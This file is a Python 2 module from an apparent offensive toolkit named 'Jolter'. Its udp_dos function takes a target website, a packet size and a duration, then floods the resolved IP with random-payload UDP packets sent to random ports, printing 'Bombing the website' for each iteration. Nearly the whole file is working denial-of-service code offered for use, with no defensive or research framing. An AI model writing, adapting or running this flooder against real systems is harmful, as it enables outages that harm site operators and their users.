#!/usr/bin/env python2

#:-:-:-:-:-:-#
#   Jolter   #
#:-:-:-:-:-:-#

#This module is a part of Jolter
#https://github.com/code-sploit/jolter 

import sys
import time
import os
import socket
from socket import *
import random
import urllib2
import string
import threading
from colors import *
from threading import *
from time import sleep
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

def udp_dos(web):
	
       	host_ip=socket.gethostbyname(web)

	package = input(color.BLUE +"   [!] Enter the Packet Size (MAX 65507): ")
	time.sleep(0.3)

	print(color.RED + "   [!] Target to be attacked with packets of data --->  %s" % (package))
	print(''+R+" +==================================================================+")
	time.sleep(0.3)

	print ""
	duration = input(color.GREEN + color.BOLD +"   [!] Enter the Time Duration in secs (0 is infinite): ")
	time.sleep(0.3)

	print(color.RED + "   [!] Time duration of the attack set ---> %s " % (duration) + color.END)
	print(''+R+" +==================================================================+")


        print '' + GR +'   [!] Final Summary of the  Attack Surface:\n'
        print '' + B + '  +-------------+----------------------------------+'
        print '' + B + '  |   Website   |       '+C + web + ''
        print '' + B + '  +-------------+----------------------------------+'
        print '' + B + '  | Attack Type |           '+C+'UDP Fl00D'
        print '' + B + '  +-------------+----------------------------------+'
        print '' + B + '  |    Time     |            \033[1;96m %s' % (duration)
        print '' + B + '  +-------------+----------------------------------+'
	print '' + B + '  |   Packets   |            \033[1;96m %i' % (package)
	print '' + B + '  +-------------+----------------------------------+'

	try:

	  b = raw_input(''+O+"\n   [!] Press 'Enter' to start the UDP Fl00d...")
	  time.sleep(0.1)
	  print ''+B+'   [*] Getting everything ready...'
	  time.sleep(0.3)
	  print ''+GR+'   [!] Finalising everything...'
	  time.sleep(0.8)
	  print ''+R+'   [!] Launching the Attack...'
	  time.sleep(0.7)

	  if b == '':
			
		n = 0
		durclock = (lambda:0, time.clock)[duration > 0]
		duration = (1, (durclock() + duration))[duration > 0]
		packet = random._urandom(package)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		print('\n'+R+" +==================================================================+")
		print ""
		print(""+GR+"   [!] The UDP flood started on %s with %s bytes for %s seconds." % (web, package, duration))

		while True:

		        if (durclock() < duration):

				n = n+1
		                print(color.BLUE + "   [!] Bombing the website | Iteration : %s" % (n))
		                port = random.randint(1, 65535)
		                sock.sendto(packet, (host_ip, port))

		        else:

		                break

		print O+'\n   [!] Website : '+GR + web
		print O+'   [!] Iterations : '+GR+str(n)+' times'
		print O+'   [!] Total Requests Sent : '+GR+ str(n*package*duration)+' packets\n'

	except KeyboardInterrupt:

		print '\n'+R+'   [!] Attack Aborted by the User\n'


